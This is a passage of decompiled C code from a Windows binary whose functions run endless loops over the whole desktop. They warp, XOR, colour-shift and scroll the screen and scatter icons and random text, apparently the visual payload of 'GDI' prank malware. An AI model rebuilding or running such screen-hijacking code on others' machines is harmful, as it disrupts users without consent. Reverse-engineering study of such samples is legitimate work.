    case 2:
      DAT_004083dc = 0xff;
      DAT_004083d8 = 0;
      if ((int)DAT_004083d0 < 0xff) {
        DAT_004083d0 = DAT_004083d0 + 3;
      }
      else {
        DAT_004083d4 = 3;
      }
      break;
    case 3:
      DAT_004083d8 = 0;
      DAT_004083d0 = 0xff;
      if ((int)DAT_004083dc < 1) {
        DAT_004083d4 = 4;
      }
      else {
        DAT_004083dc = DAT_004083dc - 3;
      }
      break;
    case 4:
      DAT_004083d0 = 0xff;
      DAT_004083dc = 0;
      if ((int)DAT_004083d8 < 0xff) {
        DAT_004083d8 = DAT_004083d8 + 3;
      }
      else {
        DAT_004083d4 = 5;
      }
      break;
    case 5:
      DAT_004083dc = 0;
      DAT_004083d8 = 0xff;
      if ((int)DAT_004083d0 < 1) {
        DAT_004083d4 = 0;
      }
      else {
        DAT_004083d0 = DAT_004083d0 - 3;
      }
    }
    h = CreateSolidBrush(((DAT_004083d0 & 0xff) << 8 | DAT_004083dc & 0xff) << 8 |
                         DAT_004083d8 & 0xff);
    SelectObject(hdc,h);
    dVar3 = (double)(local_18 / 0x96);
    libm_sse2_sin_precise();
    iVar1 = (int)(dVar3 * 50.0 + 50.0);
    dVar3 = (double)(left / 0x96);
    libm_sse2_cos_precise();
    RoundRect(hdc,left,local_18,left + 100,local_18 + 100,(int)(dVar3 * 50.0 + 50.0),iVar1);
    iVar1 = GetSystemMetrics(1);
    if (iVar1 <= local_18) {
      local_c = -1;
    }
    iVar1 = GetSystemMetrics(0);
    if (iVar1 <= left) {
      iVar2 = -1;
    }
    if (local_18 == 0) {
      local_c = 2;
    }
    if (left == 0) {
      iVar2 = 2;
    }
    DeleteObject(h);
    ReleaseDC((HWND)0x0,hdc);
    Sleep(10);
  } while( true );
}



void FUN_00401730(void)

{
  float fVar1;
  void *pvVar2;
  HDC hdc;
  int wDest;
  int hDest;
  HBITMAP h;
  undefined8 *puVar3;
  undefined4 uVar4;
  uint uVar5;
  uint uVar6;
  float10 fVar7;
  double dVar8;
  int local_94;
  uint local_90;
  uint local_8c;
  int local_88;
  int local_84;
  HDC local_80;
  HDC local_7c;
  void *local_78;
  int local_74;
  uint local_70;
  uint local_6c;
  int local_68;
  int local_64;
  double local_60;
  undefined8 local_54;
  float local_48 [4];
  BITMAPINFO local_38;
  uint local_c;
  
  local_c = DAT_00408000 ^ (uint)&local_94;
  hdc = GetDC((HWND)0x0);
  local_80 = CreateCompatibleDC(hdc);
  wDest = GetSystemMetrics(0);
  local_64 = wDest;
  hDest = GetSystemMetrics(1);
  local_38.bmiHeader.biSize = 0x2c;
  local_78 = (void *)0x0;
  local_38.bmiHeader.biClrImportant = 0;
  local_38.bmiColors[0].rgbBlue = '\0';
  local_38.bmiColors[0].rgbGreen = '\0';
  local_38.bmiColors[0].rgbRed = '\0';
  local_38.bmiColors[0].rgbReserved = '\0';
  local_38.bmiHeader.biSizeImage = 0;
  local_38.bmiHeader.biXPelsPerMeter = 0;
  local_38.bmiHeader.biYPelsPerMeter = 0;
  local_38.bmiHeader.biClrUsed = 0;
  local_38.bmiHeader.biPlanes = 1;
  local_38.bmiHeader.biBitCount = 0x20;
  local_38.bmiHeader.biCompression = 0;
  local_88 = hDest;
  local_38.bmiHeader.biWidth = wDest;
  local_38.bmiHeader.biHeight = hDest;
  h = CreateDIBSection(hdc,&local_38,0,&local_78,(HANDLE)0x0,0);
  SelectObject(local_80,h);
  uVar6 = 0;
  local_6c = 0;
  local_84 = 0;
  do {
    local_7c = GetDC((HWND)0x0);
    StretchBlt(local_80,0,0,wDest,hDest,local_7c,0,0,wDest,hDest,0xcc0020);
    local_70 = 0;
    if (0 < wDest) {
      do {
        local_94 = 0;
        if (0 < hDest) {
          local_90 = 0;
          local_68 = wDest * 4;
          local_74 = local_70 * 4;
          uVar5 = uVar6 ^ 4;
          local_8c = local_70;
          do {
            pvVar2 = local_78;
            puVar3 = (undefined8 *)FUN_00401000(local_48,*(uint *)(local_74 + (int)local_78));
            local_54 = *puVar3;
            fVar1 = *(float *)(puVar3 + 1);
            dVar8 = (double)(int)(local_8c ^ local_90);
            libm_sse2_pow_precise();
            local_60 = (double)((float)(int)(dVar8 * (double)local_84 + (double)(int)uVar5) / 400.0
                               + (float)(local_94 / local_88) * 0.2);
            fVar7 = (float10)_CIfmod();
            local_54 = CONCAT44(local_54._4_4_,(float)fVar7);
            uVar4 = FUN_004011b0((float)fVar7,local_54._4_4_,fVar1);
            local_94 = local_94 + 1;
            *(undefined4 *)(local_74 + (int)pvVar2) = uVar4;
            local_74 = local_74 + local_68;
            local_90 = local_90 + local_70;
            local_8c = local_8c + local_64;
            wDest = local_64;
            hDest = local_88;
            uVar6 = local_6c;
          } while (local_94 < local_88);
        }
        local_70 = local_70 + 1;
      } while ((int)local_70 < wDest);
    }
    local_84 = local_84 + 4;
    uVar6 = uVar6 + 1;
    local_6c = uVar6;
    StretchBlt(local_7c,0,0,wDest,hDest,local_80,0,0,wDest,hDest,0xcc0020);
    ReleaseDC((HWND)0x0,local_7c);
    DeleteDC(local_7c);
  } while( true );
}



void FUN_004019c0(void)

{
  HDC pHVar1;
  int cx;
  int iVar2;
  HBITMAP h;
  int iVar3;
  int iVar4;
  double dVar5;
  int local_54;
  HDC local_50;
  void *local_4c;
  int local_48;
  int local_44;
  int local_40;
  HDC local_3c;
  BITMAPINFO local_38;
  uint local_c;
  
  local_c = DAT_00408000 ^ (uint)&local_54;
  pHVar1 = GetDC((HWND)0x0);
  local_50 = CreateCompatibleDC(pHVar1);
  cx = GetSystemMetrics(0);
  iVar2 = GetSystemMetrics(1);
  local_4c = (void *)0x0;
  local_38.bmiHeader.biSize = 0x2c;
  local_38.bmiHeader.biClrImportant = 0;
  local_38.bmiColors[0].rgbBlue = '\0';
  local_38.bmiColors[0].rgbGreen = '\0';
  local_38.bmiColors[0].rgbRed = '\0';
  local_38.bmiColors[0].rgbReserved = '\0';
  local_38.bmiHeader.biCompression = 0;
  local_38.bmiHeader.biSizeImage = 0;
  local_38.bmiHeader.biXPelsPerMeter = 0;
  local_38.bmiHeader.biYPelsPerMeter = 0;
  local_38.bmiHeader.biClrUsed = 0;
  local_38.bmiHeader.biPlanes = 1;
  local_38.bmiHeader.biBitCount = 0x20;
  local_44 = iVar2;
  local_38.bmiHeader.biWidth = cx;
  local_38.bmiHeader.biHeight = iVar2;
  h = CreateDIBSection(pHVar1,&local_38,0,&local_4c,(HANDLE)0x0,0);
  pHVar1 = local_50;
  SelectObject(local_50,h);
  do {
    local_3c = GetDC((HWND)0x0);
    BitBlt(pHVar1,0,0,cx,iVar2,local_3c,0,0,0xcc0020);
    local_48 = 0;
    if (0 < iVar2) {
      local_54 = 0;
      do {
        iVar2 = local_48;
        iVar4 = 0;
        if (0 < cx) {
          dVar5 = (double)((float)local_48 * 0.7);
          libm_sse2_sin_precise();
          local_40 = (((int)((float)dVar5 + (float)dVar5) + iVar2 + local_44) % local_44) * cx;
          iVar2 = local_54;
          do {
            dVar5 = (double)((float)iVar4 * 0.7);
            libm_sse2_cos_precise();
            iVar3 = (int)((float)dVar5 + (float)dVar5) + iVar4;
            iVar4 = iVar4 + 1;
            *(undefined4 *)(iVar2 + (int)local_4c) =
                 *(undefined4 *)((int)local_4c + ((iVar3 + cx) % cx + local_40) * 4);
            iVar2 = iVar2 + 4;
          } while (iVar4 < cx);
        }
        local_48 = local_48 + 1;
        local_54 = local_54 + cx * 4;
        iVar2 = local_44;
      } while (local_48 < local_44);
    }
    pHVar1 = local_3c;
    BitBlt(local_3c,0,0,cx,iVar2,local_50,0,0,0xcc0020);
    ReleaseDC((HWND)0x0,pHVar1);
    DeleteDC(pHVar1);
    pHVar1 = local_50;
  } while( true );
}



void FUN_00401b80(void)

{
  char *pcVar1;
  char cVar2;
  HWND hWnd;
  HDC hdc;
  HDC hdc_00;
  HBITMAP h;
  int iVar3;
  char cVar4;
  code *pcVar5;
  code *pcVar6;
  int iVar7;
  void *local_40;
  int local_3c;
  int local_38;
  BITMAPINFO local_34;
  uint local_8;
  
  pcVar6 = GetDC_exref;
  local_8 = DAT_00408000 ^ (uint)&stack0xfffffffc;
  GetDC((HWND)0x0);
  hWnd = GetDesktopWindow();
  local_38 = GetSystemMetrics(0);
  local_3c = GetSystemMetrics(1);
  local_34.bmiHeader.biSize = 0x28;
  local_34.bmiHeader.biWidth = local_38;
  local_34.bmiHeader.biPlanes = 1;
  local_34.bmiHeader.biBitCount = 0x18;
  local_34.bmiHeader.biCompression = 0;
  local_34.bmiHeader.biSizeImage = 0;
  local_34.bmiHeader.biXPelsPerMeter = 0;
  local_34.bmiHeader.biYPelsPerMeter = 0;
  local_34.bmiColors[0].rgbBlue = '\0';
  local_34.bmiColors[0].rgbGreen = '\0';
  local_34.bmiColors[0].rgbRed = '\0';
  local_34.bmiColors[0].rgbReserved = '\0';
  local_34.bmiHeader.biClrUsed = 0;
  local_34.bmiHeader.biClrImportant = 0;
  pcVar5 = DeleteObject_exref;
  local_34.bmiHeader.biHeight = local_3c;
  do {
    hdc = (HDC)(*pcVar6)(0);
    hdc_00 = CreateCompatibleDC(hdc);
    h = CreateDIBSection(hdc,&local_34,0,&local_40,(HANDLE)0x0,0);
    SelectObject(hdc_00,h);
    BitBlt(hdc_00,0,0,local_38,local_3c,hdc,0,0,0xcc0020);
    iVar3 = 0;
    if (0 < local_3c * local_38) {
      iVar7 = 0;
      do {
        cVar4 = (char)(iVar3 % local_38);
        pcVar1 = (char *)((int)local_40 + iVar7 + 2);
        *pcVar1 = *pcVar1 + ((char)(iVar3 / local_3c) - cVar4);
        cVar2 = (char)iVar3;
        pcVar1 = (char *)((int)local_40 + iVar7 + 1);
        *pcVar1 = *pcVar1 + (cVar2 - cVar4);
        iVar3 = iVar3 + 1;
        *(char *)((int)local_40 + iVar7) = *(char *)((int)local_40 + iVar7) + (cVar2 - cVar4);
        pcVar5 = DeleteObject_exref;
        iVar7 = iVar7 + 3;
      } while (iVar3 < local_3c * local_38);
    }
    BitBlt(hdc,0,0,local_38,local_3c,hdc_00,0,0,0x440328);
    ReleaseDC(hWnd,hdc);
    DeleteDC(hdc);
    DeleteDC(hdc_00);
    (*pcVar5)(h);
    (*pcVar5)(hWnd);
    (*pcVar5)(local_40);
    (*pcVar5)(&local_38);
    (*pcVar5)(&local_3c);
    (*pcVar5)(&local_34);
    pcVar6 = GetDC_exref;
  } while( true );
}



void FUN_00401d00(void)

{
  HDC hdc;
  int cx;
  int cy;
  HDC hdc_00;
  HBITMAP h;
  DWORD DVar1;
  int x1;
  int local_1c;
  DWORD local_c;
  
  local_1c = 0;
  local_c = GetTickCount();
  do {
    do {
      hdc = GetDC((HWND)0x0);
      cx = GetSystemMetrics(0);
      cy = GetSystemMetrics(1);
      hdc_00 = CreateCompatibleDC(hdc);
      h = CreateCompatibleBitmap(hdc,cx,cy);
      SelectObject(hdc_00,h);
      BitBlt(hdc_00,0,0,cx,cy,hdc,0,0,0xcc0020);
      DVar1 = GetTickCount();
      x1 = local_1c + (DVar1 - local_c) / 0x32;
      BitBlt(hdc,0,0,cx - x1,cy,hdc_00,x1,0,0xcc0020);
      BitBlt(hdc,cx - x1,0,x1,cy,hdc_00,0,0,0xcc0020);
      if (cx <= x1) {
        local_c = DVar1;
      }
      ReleaseDC((HWND)0x0,hdc);
      DeleteDC(hdc_00);
      DeleteObject(h);
      Sleep(10);
      local_1c = 0;
    } while (cx <= x1);
    local_1c = x1;
  } while( true );
}



void FUN_00401e10(void)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  HDC hDC;
  HMODULE hInstance;
  int iVar5;
  HICON hIcon;
  code *pcVar6;
  double dVar7;
  int local_18;
  
  pcVar6 = rand_exref;
  do {
    iVar1 = GetSystemMetrics(0);
    iVar2 = GetSystemMetrics(1);
    iVar3 = (*pcVar6)();
    iVar4 = (*pcVar6)();
    local_18 = 0;
    if (0 < iVar2 + iVar1) {
      do {
        hDC = GetDC((HWND)0x0);
        hInstance = LoadLibraryA("moricons.dll");
        iVar5 = rand();
        hIcon = LoadIconW(hInstance,(LPCWSTR)(iVar5 % 0x71 & 0xffff));
        dVar7 = (double)(local_18 + 0x1e);
        libm_sse2_cos_precise();
        iVar5 = (int)(dVar7 * (double)local_18 + 10.0 + (double)(iVar4 % iVar2));
        dVar7 = (double)(local_18 + 0x1e);
        libm_sse2_tan_precise();
        DrawIcon(hDC,(int)(dVar7 * (double)local_18 + 10.0 + (double)(iVar3 % iVar1)),iVar5,hIcon);
        ReleaseDC((HWND)0x0,hDC);
        local_18 = local_18 + 1;
        pcVar6 = rand_exref;
      } while (local_18 < iVar2 + iVar1);
    }
    Sleep(0x32);
  } while( true );
}



void FUN_00401f40(void)

{
  float fVar1;
  void *pvVar2;
  HDC hdc;
  int hDest;
  HBITMAP h;
  undefined4 uVar3;
  uint uVar4;
  uint uVar5;
  int wDest;
  float10 fVar6;
  double dVar7;
  undefined8 uVar8;
  undefined1 auStack_8c [4];
  uint local_88;
  int local_84;
  int local_80;
  HDC local_7c;
  HDC local_78;
  void *local_74;
  int local_70;
  int local_6c;
  uint local_68;
  int local_64;
  double local_60;
  undefined8 local_54;
  float local_48 [4];
  BITMAPINFO local_38;
  uint local_c;
  
  local_c = DAT_00408000 ^ (uint)auStack_8c;
  hdc = GetDC((HWND)0x0);
  local_7c = CreateCompatibleDC(hdc);
  local_84 = GetSystemMetrics(0);
  hDest = GetSystemMetrics(1);
  local_38.bmiHeader.biSize = 0x2c;
  local_38.bmiHeader.biWidth = local_84;
  local_38.bmiHeader.biSizeImage = 0;
  local_38.bmiHeader.biXPelsPerMeter = 0;
  local_38.bmiHeader.biYPelsPerMeter = 0;
  local_38.bmiHeader.biClrUsed = 0;
  local_38.bmiHeader.biClrImportant = 0;
  local_38.bmiColors[0].rgbBlue = '\0';
  local_38.bmiColors[0].rgbGreen = '\0';
  local_38.bmiColors[0].rgbRed = '\0';
  local_38.bmiColors[0].rgbReserved = '\0';
  local_38.bmiHeader.biPlanes = 1;
  local_38.bmiHeader.biBitCount = 0x20;
  local_38.bmiHeader.biCompression = 0;
  local_74 = (void *)0x0;
  local_6c = hDest;
  local_38.bmiHeader.biHeight = hDest;
  h = CreateDIBSection(hdc,&local_38,0,&local_74,(HANDLE)0x0,0);
  SelectObject(local_7c,h);
  uVar4 = 0;
  local_68 = 0;
  wDest = local_84;
  do {
    local_78 = GetDC((HWND)0x0);
    StretchBlt(local_7c,0,0,wDest,hDest,local_78,0,0,wDest,hDest,0x330008);
    local_80 = 0;
    if (0 < wDest) {
      do {
        local_88 = 0;
        if (0 < hDest) {
          local_64 = wDest * 4;
          uVar5 = uVar4 ^ 5;
          local_70 = local_80 * 4;
          do {
            pvVar2 = local_74;
            uVar8 = FUN_00401000(local_48,*(uint *)(local_70 + (int)local_74));
            local_54 = *(undefined8 *)uVar8;
            fVar1 = *(float *)((undefined8 *)uVar8 + 1);
            dVar7 = (double)(int)(local_88 | (uint)((ulonglong)uVar8 >> 0x20));
            libm_sse2_tan_precise();
            local_60 = (double)((float)(int)(dVar7 * (double)(int)uVar5 + (double)(int)uVar5) /
                                400.0 + (float)((int)local_88 / local_6c) * 0.2);
            fVar6 = (float10)_CIfmod();
            local_54 = CONCAT44(local_54._4_4_,(float)fVar6);
            uVar3 = FUN_004011b0((float)fVar6,local_54._4_4_,fVar1);
            *(undefined4 *)(local_70 + (int)pvVar2) = uVar3;
            local_70 = local_70 + local_64;
            local_88 = local_88 + 1;
            hDest = local_6c;
            uVar4 = local_68;
            wDest = local_84;
          } while ((int)local_88 < local_6c);
        }
        local_80 = local_80 + 1;
      } while (local_80 < wDest);
    }
    uVar4 = uVar4 + 1;
    local_68 = uVar4;
    StretchBlt(local_78,0,0,wDest,hDest,local_7c,0,0,wDest,hDest,0xcc0020);
    ReleaseDC((HWND)0x0,local_78);
    DeleteDC(local_78);
  } while( true );
}



void FUN_004021a0(void)

{
  HDC pHVar1;
  HDC hdc;
  int cx;
  int cy;
  HBITMAP h;
  uint uVar2;
  int iVar3;
  undefined1 uVar4;
  int iVar5;
  int local_44;
  uint local_3c;
  void *local_38;
  BITMAPINFO local_34;
  uint local_8;
  
  local_8 = DAT_00408000 ^ (uint)&stack0xfffffffc;
  pHVar1 = GetDC((HWND)0x0);
  hdc = CreateCompatibleDC(pHVar1);
  cx = GetSystemMetrics(0);
  cy = GetSystemMetrics(1);
  local_38 = (void *)0x0;
  local_34.bmiHeader.biSize = 0x2c;
  local_34.bmiHeader.biClrImportant = 0;
  local_34.bmiColors[0].rgbBlue = '\0';
  local_34.bmiColors[0].rgbGreen = '\0';
  local_34.bmiColors[0].rgbRed = '\0';
  local_34.bmiColors[0].rgbReserved = '\0';
  local_34.bmiHeader.biCompression = 0;
  local_34.bmiHeader.biSizeImage = 0;
  local_34.bmiHeader.biXPelsPerMeter = 0;
  local_34.bmiHeader.biYPelsPerMeter = 0;
  local_34.bmiHeader.biClrUsed = 0;
  local_34.bmiHeader.biPlanes = 1;
  local_34.bmiHeader.biBitCount = 0x20;
  local_34.bmiHeader.biWidth = cx;
  local_34.bmiHeader.biHeight = cy;
  h = CreateDIBSection(pHVar1,&local_34,0,&local_38,(HANDLE)0x0,0);
  SelectObject(hdc,h);
  do {
    pHVar1 = GetDC((HWND)0x0);
    BitBlt(hdc,0,0,cx,cy,pHVar1,0,0,0xcc0020);
    uVar2 = 0;
    if (0 < cy) {
      local_44 = 0;
      do {
        local_3c = 0;
        iVar5 = local_44;
        if (0 < cx) {
          do {
            iVar3 = local_3c + (*(byte *)((int)local_38 + iVar5) - 0x32);
            uVar4 = 0;
            if (-1 < iVar3) {
              uVar4 = (char)iVar3;
            }
            *(undefined1 *)((int)local_38 + iVar5) = uVar4;
            iVar3 = (*(byte *)((int)local_38 + iVar5 + 1) - 100) + uVar2;
            uVar4 = 0;
            if (-1 < iVar3) {
              uVar4 = (char)iVar3;
            }
            *(undefined1 *)((int)local_38 + iVar5 + 1) = uVar4;
            uVar4 = 0;
            iVar3 = (local_3c ^ uVar2) + (*(byte *)((int)local_38 + iVar5 + 2) - 0x96);
            if (-1 < iVar3) {
              uVar4 = (undefined1)iVar3;
            }
            *(undefined1 *)((int)local_38 + iVar5 + 2) = uVar4;
            local_3c = local_3c + 1;
            iVar5 = iVar5 + 4;
          } while ((int)local_3c < cx);
        }
        uVar2 = uVar2 + 1;
        local_44 = local_44 + cx * 4;
      } while ((int)uVar2 < cy);
    }
    BitBlt(pHVar1,0,0,cx,cy,hdc,0,0,0xcc0020);
    ReleaseDC((HWND)0x0,pHVar1);
    DeleteDC(pHVar1);
  } while( true );
}



void FUN_00402320(void)

{
  HDC hdc;
  int iVar1;
  int cy;
  int iVar2;
  
  do {
    hdc = GetDC((HWND)0x0);
    iVar1 = GetSystemMetrics(0);
    cy = GetSystemMetrics(1);
    iVar2 = rand();
    iVar2 = iVar2 % iVar1;
    BitBlt(hdc,iVar2,0xc,0x78,cy,hdc,iVar2,0,0xee0086);
    BitBlt(hdc,iVar2,-0xb,-0x6e,cy,hdc,iVar2,0,0x8800c6);
    ReleaseDC((HWND)0x0,hdc);
    Sleep(10);
  } while( true );
}



void FUN_00402390(void)

{
  HDC pHVar1;
  HDC hdc;
  int cx;
  int cy;
  HBITMAP h;
  int iVar2;
  int local_40;
  void *local_38;
  BITMAPINFO local_34;
  uint local_8;
  
  local_8 = DAT_00408000 ^ (uint)&stack0xfffffffc;
  pHVar1 = GetDC((HWND)0x0);
  hdc = CreateCompatibleDC(pHVar1);
  cx = GetSystemMetrics(0);
  cy = GetSystemMetrics(1);
  local_38 = (void *)0x0;
  local_34.bmiHeader.biSize = 0x2c;
  local_34.bmiHeader.biClrImportant = 0;
  local_34.bmiColors[0].rgbBlue = '\0';
  local_34.bmiColors[0].rgbGreen = '\0';
  local_34.bmiColors[0].rgbRed = '\0';
  local_34.bmiColors[0].rgbReserved = '\0';
  local_34.bmiHeader.biCompression = 0;
  local_34.bmiHeader.biSizeImage = 0;
  local_34.bmiHeader.biXPelsPerMeter = 0;
  local_34.bmiHeader.biYPelsPerMeter = 0;
  local_34.bmiHeader.biClrUsed = 0;
  local_34.bmiHeader.biPlanes = 1;
  local_34.bmiHeader.biBitCount = 0x20;
  local_34.bmiHeader.biWidth = cx;
  local_34.bmiHeader.biHeight = cy;
  h = CreateDIBSection(pHVar1,&local_34,0,&local_38,(HANDLE)0x0,0);
  SelectObject(hdc,h);
  do {
    pHVar1 = GetDC((HWND)0x0);
    BitBlt(hdc,0,0,cx,cy,pHVar1,0,0,0xcc0020);
    if (0 < cy * cx) {
      local_40 = 0;
      iVar2 = 0;
      do {
        *(byte *)((int)local_38 + iVar2 * 4 + 1) =
             *(byte *)(local_40 + (int)local_38) ^ (byte)(iVar2 % cx);
        *(byte *)((int)local_38 + iVar2 * 4) =
             *(byte *)((int)local_38 + iVar2 * 4) ^ (byte)(iVar2 / cx);
        iVar2 = iVar2 + 1;
        local_40 = local_40 + 4;
      } while (iVar2 < cy * cx);
    }
    BitBlt(pHVar1,0,0,cx,cy,hdc,0,0,0xcc0020);
    ReleaseDC((HWND)0x0,pHVar1);
    DeleteDC(pHVar1);
  } while( true );
}



void FUN_004024e0(void)

{
  HDC hdc;
  int iVar1;
  HDC hDC;
  HDC hdc_00;
  HBITMAP h;
  uint unaff_EDI;
  int y;
  code *pcVar2;
  double dVar3;
  int y1;
  DWORD rop;
  int iVar4;
  float fVar5;
  int cx;
  double dVar6;
  longlong lVar7;
  
  lVar7 = (ulonglong)unaff_EDI << 0x20;
  pcVar2 = BitBlt_exref;
  do {
    hdc = GetDC((HWND)0x0);
    iVar1 = GetSystemMetrics(0);
    hDC = (HDC)GetSystemMetrics(1);
    hdc_00 = CreateCompatibleDC(hdc);
    h = CreateCompatibleBitmap(hdc,iVar1,(int)hDC);
    SelectObject(hdc_00,h);
    dVar3 = (double)CONCAT44((int)((ulonglong)lVar7 >> 0x20),0xcc0020);
    cx = 0;
    iVar4 = iVar1;
    (*pcVar2)(hdc_00,0,0,iVar1,hDC,hdc,0,0);
    iVar1 = iVar1 + iVar4;
    fVar5 = 0.0;
    if (0.0 < (float)iVar1) {
      do {
        y = (int)fVar5;
        rop = 0xcc0020;
        y1 = y;
        dVar6 = dVar3;
        libm_sse2_sin_precise();
        pcVar2 = BitBlt_exref;
        BitBlt(hdc_00,0,y,cx,1,hdc_00,(int)(dVar3 * 50.0),y1,rop);
        dVar3 = dVar6 + 60.0;
        fVar5 = fVar5 + 0.99;
      } while (fVar5 < (float)iVar1);
    }
    (*pcVar2)(hDC,0,0,cx,iVar4,hdc_00,0,0,0xcc0020);
    ReleaseDC((HWND)0x0,hDC);
    DeleteDC(hdc_00);
    lVar7 = CONCAT44((int)((ulonglong)dVar3 >> 0x20),h);
    DeleteObject(h);
  } while( true );
}



void FUN_00402640(void)

{
  int nWidth;
  int nHeight;
  LPVOID lpBits;
  HDC hdc;
  HDC hdc_00;
  HBITMAP hbit;
  char *pcVar1;
  int iVar2;
  int iVar3;
  
  nWidth = GetSystemMetrics(0);
  nHeight = GetSystemMetrics(1);
  lpBits = VirtualAlloc((LPVOID)0x0,(nHeight + 1) * nWidth * 4,0x3000,4);
  iVar2 = nHeight * nWidth;
  do {
    hdc = GetDC((HWND)0x0);
    hdc_00 = CreateCompatibleDC(hdc);
    hbit = CreateBitmap(nWidth,nHeight,1,0x20,lpBits);
    SelectObject(hdc_00,hbit);
    BitBlt(hdc_00,0,0,nWidth,nHeight,hdc,0,0,0xee0086);
    GetBitmapBits(hbit,iVar2 * 4,lpBits);
    pcVar1 = (char *)((int)lpBits + 0x82);
    iVar3 = iVar2 + -0x20;
    if (0x20 < iVar2) {
      do {
        *pcVar1 = pcVar1[8] + -5;
        iVar3 = iVar3 + -1;
        pcVar1 = pcVar1 + 4;
      } while (iVar3 != 0);
    }
    SetBitmapBits(hbit,iVar2 * 4,lpBits);
    BitBlt(hdc,0,0,nWidth,nHeight,hdc_00,0,0,0x440328);
    ReleaseDC((HWND)0x0,hdc);
    DeleteObject(hbit);
    DeleteObject(hdc_00);
    DeleteObject(hdc);
  } while( true );
}



void FUN_00402770(void)

{
  HDC hdcSrc;
  HDC pHVar1;
  int iVar2;
  int cy;
  HWND hWnd;
  int iVar3;
  int iVar4;
  HBRUSH h;
  uint uVar5;
  DWORD rop;
  tagRECT *lpRect;
  HDC local_44;
  HDC local_40;
  int local_3c;
  HBITMAP local_38;
  tagRECT local_34;
  POINT local_24;
  int local_1c;
  int local_18;
  int local_14;
  int local_10;
  uint local_c;
  
  local_c = DAT_00408000 ^ (uint)&local_44;
  do {
    pHVar1 = GetDC((HWND)0x0);
    local_44 = pHVar1;
    iVar2 = GetSystemMetrics(0);
    local_3c = iVar2;
    cy = GetSystemMetrics(1);
    pHVar1 = CreateCompatibleDC(pHVar1);
    local_40 = pHVar1;
    local_38 = CreateCompatibleBitmap(local_44,iVar2,cy);
    SelectObject(pHVar1,local_38);
    lpRect = &local_34;
    hWnd = GetDesktopWindow();
    GetWindowRect(hWnd,lpRect);
    iVar2 = rand();
    iVar3 = rand();
    iVar4 = rand();
    h = CreateSolidBrush(iVar4 % 0xff & 0xffU |
                         (iVar3 % 0xff & 0xffU | (iVar2 % 0xff & 0xffU) << 8) << 8);
    pHVar1 = local_44;
    SelectObject(local_44,h);
    iVar2 = rand();
    local_24.x = local_34.left + -5 + iVar2 % 0xb;
    iVar2 = rand();
    local_24.y = local_34.top + -10 + iVar2 % 0x15;
    iVar2 = rand();
    local_1c = local_34.right + -10 + iVar2 % 0x15;
    iVar2 = rand();
    local_18 = local_34.top + -0x14 + iVar2 % 0x29;
    iVar2 = rand();
    local_14 = local_34.left - iVar2 % 0x15;
    iVar2 = rand();
    hdcSrc = local_40;
    local_10 = local_34.bottom + -0x14 + iVar2 % 0x15;
    PlgBlt(local_40,&local_24,pHVar1,local_34.left,local_34.top,local_34.right - local_34.left,
           local_34.bottom - local_34.top,(HBITMAP)0x0,0,0);
    uVar5 = rand();
    pHVar1 = local_44;
    rop = 0x895232;
    if ((uVar5 & 1) == 0) {
      rop = 0x987654;
    }
    BitBlt(local_44,0,0,local_3c,cy,hdcSrc,0,0,rop);
    DeleteObject(h);
    ReleaseDC((HWND)0x0,pHVar1);
    DeleteDC(hdcSrc);
    DeleteObject(local_38);
  } while( true );
}



void FUN_00402950(void)

{
  char cVar1;
  HDC hdc;
  int iVar2;
  int iVar3;
  DWORD DVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  HFONT h;
  int iVar10;
  DWORD iCharSet;
  DWORD iOutPrecision;
  DWORD iClipPrecision;
  DWORD iQuality;
  DWORD iPitchAndFamily;
  LPCWSTR lpString;
  char *pcVar11;
  undefined2 local_48;
  uint local_8;
  
  local_8 = DAT_00408000 ^ (uint)&stack0xfffffffc;
  do {
    hdc = GetDC((HWND)0x0);
    iVar2 = GetSystemMetrics(0);
    iVar3 = GetSystemMetrics(1);
    SetBkMode(hdc,0);
    DVar4 = GetTickCount();
    srand(DVar4);
    iVar10 = 0;
    do {
      uVar5 = rand();
      uVar5 = uVar5 & 0x800000ff;
      if ((int)uVar5 < 0) {
        uVar5 = (uVar5 - 1 | 0xffffff00) + 1;
      }
      (&local_48)[iVar10] = (short)uVar5 + 1;
      iVar10 = iVar10 + 1;
    } while (iVar10 < 0x20);
    iVar10 = rand();
    iVar6 = rand();
    iVar7 = rand();
    SetTextColor(hdc,iVar7 % 0xff & 0xffU |
                     (iVar6 % 0xff & 0xffU | (iVar10 % 0xff & 0xffU) << 8) << 8);
    uVar5 = rand();
    uVar5 = uVar5 & 0x80000001;
    if ((int)uVar5 < 0) {
      uVar5 = (uVar5 - 1 | 0xfffffffe) + 1;
    }
    uVar8 = rand();
    uVar8 = uVar8 & 0x80000001;
    if ((int)uVar8 < 0) {
      uVar8 = (uVar8 - 1 | 0xfffffffe) + 1;
    }
    pcVar11 = "Fredoka";
    iPitchAndFamily = 0;
    iQuality = 0;
    iClipPrecision = 0;
    iOutPrecision = 0;
    iCharSet = 0;
    uVar9 = rand();
    DVar4 = uVar9 & 0x80000001;
    if ((int)DVar4 < 0) {
      DVar4 = (DVar4 - 1 | 0xfffffffe) + 1;
    }
    h = CreateFontA(300,0,0,0,100,DVar4,uVar8,uVar5,iCharSet,iOutPrecision,iClipPrecision,iQuality,
                    iPitchAndFamily,pcVar11);
    SelectObject(hdc,h);
    pcVar11 = (char *)&local_48;
    do {
      cVar1 = *pcVar11;
      pcVar11 = pcVar11 + 1;
    } while (cVar1 != '\0');
    iVar6 = (int)pcVar11 - ((int)&local_48 + 1);
    iVar10 = rand();
    iVar10 = iVar10 % iVar3;
    lpString = &local_48;
    iVar3 = rand();
    TextOutW(hdc,iVar3 % iVar2,iVar10,lpString,iVar6);
    DeleteObject(h);
    ReleaseDC((HWND)0x0,hdc);
    Sleep(100);
  } while( true );
}



void FUN_00402ab0(void)

{
  char *pcVar1;
  HDC pHVar2;
  int iVar3;
  int hDest;
  HBITMAP h;
  char cVar4;
  int iVar5;
  uint uVar6;
  float10 fVar7;
  double dVar8;
  undefined1 auStack_b4 [12];
  void *local_a8;
  int local_a4;
  uint local_a0;
  int local_9c;
  HDC local_98;
  int local_94;
  int local_90;
  int local_8c;
  int local_88;
  HDC local_84;
  double dStack_80;
  double local_78;
  BITMAPINFO local_70;
  uint local_44;
  
  local_44 = DAT_00408000 ^ (uint)auStack_b4;
  pHVar2 = GetDC((HWND)0x0);
  local_98 = CreateCompatibleDC(pHVar2);
  iVar3 = GetSystemMetrics(0);
  local_8c = iVar3;
  hDest = GetSystemMetrics(1);
  local_70.bmiHeader.biSize = 0x2c;
  local_a8 = (void *)0x0;
